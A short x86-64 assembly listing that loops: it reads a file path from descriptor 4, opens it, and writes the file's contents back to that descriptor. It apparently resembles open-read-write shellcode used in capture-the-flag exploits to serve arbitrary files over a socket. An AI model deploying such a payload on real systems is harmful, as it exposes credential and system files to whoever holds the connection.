section .text
loop:
        mov rdi, 4
        mov rsi, rsp
        mov rdx, 0x1000
        mov rax, 0
        syscall

        mov rdi, rsp
        xor rsi, rsi
        mov rax, 2
        syscall                     ; open

        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0x1000
        mov rax, 0
        syscall

        mov rdx, rax
        mov rdi, 4
        mov rsi, rsp
        mov rax, 1
        syscall

        jmp loop

exit:
        xor rdi, rdi
        mov rax, 60
        syscall                     ; exit
